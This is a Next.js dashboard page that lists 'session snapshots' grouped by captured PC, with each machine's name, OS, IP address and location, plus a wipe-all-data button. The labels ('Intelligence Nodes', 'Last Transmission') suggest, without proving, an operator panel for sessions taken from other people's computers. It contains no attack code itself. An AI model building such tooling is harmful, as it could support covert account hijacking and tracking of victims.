"use client";

import React, { useEffect, useState } from "react";
import GlassCard from "@/components/GlassCard";
import { 
  Database, Users, Shield, Clock, ExternalLink, Facebook, Instagram, Twitter, MessageSquare, Play, Mail, Bot, Globe, AlertCircle, ShoppingCart, GraduationCap, Laptop, Cpu, Monitor, MapPin, Trash2, Smartphone
} from "lucide-react";
import Link from "next/link";
import { supabase, SessionSnapshot } from "@/lib/supabase";

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);
  if (diffInSeconds < 60) return "just now";
  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m ago`;
  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h ago`;
  return captured.toLocaleDateString();
};

export default function Home() {
  const [stats, setStats] = useState([
    { label: "Total Sessions", value: "---", icon: Database, color: "text-blue-500" },
    { label: "Unique Users", value: "---", icon: Users, color: "text-purple-500" },
    { label: "Live Snapshots", value: "---", icon: Shield, color: "text-emerald-500" },
    { label: "Last Capture", value: "---", icon: Clock, color: "text-amber-500" },
  ]);
  const [activeDevices, setActiveDevices] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [deleteProgress, setDeleteProgress] = useState("");

  useEffect(() => {
    fetchDashboardData();
    const interval = setInterval(fetchDashboardData, 30000);
    return () => clearInterval(interval);
  }, []);

  const fetchDashboardData = async () => {
    try {
      const { data: allSnapshots } = await supabase
        .from("session_snapshots")
        .select("*")
        .order("captured_at", { ascending: false })
        .limit(1000);

      if (!allSnapshots) return;

      // Group by Device
      const grouped: Record<string, any[]> = {};
      allSnapshots.forEach(s => {
        const dId = s.device_id || "unknown-node";
        if (!grouped[dId]) grouped[dId] = [];
        grouped[dId].push(s);
      });

      const deviceList = Object.keys(grouped).map(dId => {
        const devSess = grouped[dId];
        const latest = devSess[0];
        return {
          id: dId,
          pc_name: latest.pc_name || "Unknown Agent",
          os: latest.os || "Unknown OS",
          ip: latest.ip_address || "0.0.0.0",
          location: latest.location_city ? `${latest.location_city}, ${latest.location_country || ""}` : "Remote",
          lastSeen: latest.captured_at,
          count: devSess.length
        };
      });

      setActiveDevices(deviceList.slice(0, 5));

      const uniqueUsers = new Set(allSnapshots.map(u => u.user_id)).size;
      const lastCapture = allSnapshots.length > 0 ? allSnapshots[0].captured_at : "---";

      setStats([
        { label: "Intelligence Nodes", value: deviceList.length.toString(), icon: Database, color: "text-blue-500" },
        { label: "Unique Agents", value: uniqueUsers.toString(), icon: Users, color: "text-purple-500" },
        { label: "Active Captures", value: allSnapshots.length.toLocaleString(), icon: Shield, color: "text-emerald-500" },
        { label: "Last Transmission", value: lastCapture !== "---" ? formatRelativeTime(lastCapture) : "---", icon: Clock, color: "text-amber-500" },
      ]);

    } catch (error) {
      console.error("Dashboard fetch error:", error);
    } finally {
      setLoading(false);
    }
  };

  const deleteAllData = async () => {
    if (!window.confirm("⚠️ ¿ESTÁS SEGURO? Esta acción vaciará por lotes TODA la base de datos de manera irreversible.")) {
      return;
    }
    setLoading(true);
    setDeleteProgress("IDENTIFICANDO REGISTROS...");
    try {
      // Fetch all snapshot IDs
      const { data: allIds, error: fetchError } = await supabase.from("session_snapshots").select("id");
      if (fetchError) throw fetchError;
      
      if (allIds && allIds.length > 0) {
        const ids = allIds.map(i => i.id);
        const batchSize = 100;
        const total = ids.length;
        
        for (let i = 0; i < ids.length; i += batchSize) {
          const chunk = ids.slice(i, i + batchSize);
          setDeleteProgress(`BORRANDO LOTE: ${Math.min(i + batchSize, total)} / ${total}...`);
          const { error: delError } = await supabase.from("session_snapshots").delete().in("id", chunk);
          if (delError) throw delError;
        }
      }
      
      alert("✅ Base de datos vaciada con éxito sin errores de timeout.");
      setDeleteProgress("");
      fetchDashboardData();
    } catch (err: any) {
      alert("❌ Error: " + (err.message || "Timeout persistente"));
      setDeleteProgress("");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-8">
      <header className="flex flex-col gap-2">
        <h2 className="text-4xl font-black tracking-tight text-white/90">System Overview</h2>
        <p className="text-gray-500 font-medium tracking-wide uppercase text-xs">Multi-Device Intelligence & Real-Time Monitoring</p>
      </header>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        {stats.map((stat, idx) => (
          <GlassCard key={stat.label} delay={idx * 0.1} className="flex items-center gap-5 p-6 border-white/5 hover:border-white/10 transition-all">
            <div className={`w-14 h-14 rounded-[1.25rem] bg-black/40 flex items-center justify-center shadow-inner border border-white/5 ${stat.color}`}>
              <stat.icon size={28} />
            </div>
            <div>
              <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-0.5">{stat.label}</p>
              <p className="text-3xl font-black text-white tracking-tighter">{stat.value}</p>
            </div>
          </GlassCard>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        <GlassCard delay={0.4} className="lg:col-span-2 p-0 overflow-hidden">
          <div className="p-8 border-b border-white/5 bg-white/[0.02] flex items-center justify-between">
            <h3 className="text-sm font-black uppercase tracking-[0.3em] text-white/40">Active Intel Nodes (By PC)</h3>
            <div className="flex items-center gap-2 text-[10px] font-black text-blue-400 bg-blue-400/10 px-3 py-1.5 rounded-full border border-blue-400/20 shadow-sm">
                <div className="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse" /> LIVE SYNC
            </div>
          </div>
          <div className="divide-y divide-white/5">
            {loading ? (
               [1,2,3,4,5].map(i => <div key={i} className="h-20 bg-white/5 animate-pulse" />)
            ) : activeDevices.length > 0 ? (
              activeDevices.map((device, idx) => (
                <Link 
                  key={device.id} 
                  href="/sessions"
                  className="flex items-center justify-between p-7 hover:bg-white/[0.03] transition-all group border-l-4 border-transparent hover:border-blue-500"
                >
                  <div className="flex items-center gap-6">
                    <div className="w-12 h-12 rounded-2xl bg-blue-500/10 flex items-center justify-center text-blue-400 shadow-inner group-hover:scale-110 transition-transform">
                      <Monitor size={20} />
                    </div>
                    <div>
                      <p className="font-black text-white/90 text-lg uppercase tracking-wider">{device.pc_name}</p>
                      <p className="text-xs text-gray-500 font-bold uppercase tracking-wider flex items-center gap-2">
                        <MapPin size={12}/> {device.location} | <span className="text-blue-400/60">{device.ip}</span>
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-6">
                    <div className="text-right">
                      <p className="text-[10px] font-black text-gray-600 uppercase tracking-widest">{device.os}</p>
                      <p className="text-[9px] font-bold text-gray-700">{formatRelativeTime(device.lastSeen)}</p>
                    </div>
                    <ExternalLink size={18} className="text-gray-700 group-hover:text-blue-400 transition-colors" />
                  </div>
                </Link>
              ))
            ) : (
                <div className="p-20 text-center text-gray-500 font-bold uppercase tracking-widest text-xs">No devices detected.</div>
            )}
          </div>
        </GlassCard>

        <div className="space-y-8">
          <GlassCard delay={0.5} className="p-8 border-t-4 border-blue-500 shadow-2xl">
            <h3 className="text-[11px] font-black uppercase tracking-[0.25em] text-white/30 mb-6">Operations Hub</h3>
            <div className="grid gap-4">
              <Link 
                href="/sessions"
                className="flex items-center justify-center w-full py-5 px-6 rounded-[1.5rem] bg-blue-600 hover:bg-blue-500 transition-all font-black text-sm uppercase tracking-widest text-white shadow-2xl shadow-blue-500/20 active:scale-95"
              >
                Access Archives
              </Link>
              <button onClick={deleteAllData} className="w-full py-5 px-6 rounded-[1.5rem] bg-red-500/10 hover:bg-red-500/20 transition-all font-black text-xs uppercase tracking-[0.2em] text-red-500 border border-red-500/20 flex items-center justify-center gap-2">
                <Trash2 size={16} /> WIPE DATABASE
              </button>
              {deleteProgress && (
                <div className="text-[9px] font-black text-red-400 uppercase tracking-widest animate-pulse text-center">{deleteProgress}</div>
              )}
            </div>
          </GlassCard>

          <GlassCard delay={0.6} className="p-8">
            <h3 className="text-[11px] font-black uppercase tracking-[0.25em] text-white/30 mb-6">Nexus Health</h3>
            <div className="space-y-6">
              <div className="flex items-center justify-between text-[11px] font-black tracking-widest">
                <span className="text-gray-500 uppercase">Local Grid Status</span>
                <span className="text-emerald-400 flex items-center gap-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse shadow-[0_0_8px_rgba(52,211,153,0.5)]" />
                  CONNECTED
                </span>
              </div>
              <div className="space-y-3">
                <div className="flex items-center justify-between text-[11px] font-black tracking-widest">
                  <span className="text-gray-500 uppercase">Storage Bandwidth</span>
                  <span className="text-white/80">68% DEPLETED</span>
                </div>
                <div className="w-full bg-black/40 rounded-full h-2 overflow-hidden border border-white/5 shadow-inner">
                  <div className="bg-gradient-to-r from-blue-600 to-indigo-600 h-full w-[68%] rounded-full shadow-[0_0_15px_rgba(37,99,235,0.4)]" />
                </div>
              </div>
            </div>
          </GlassCard>
        </div>
      </div>
    </div>
  );
}
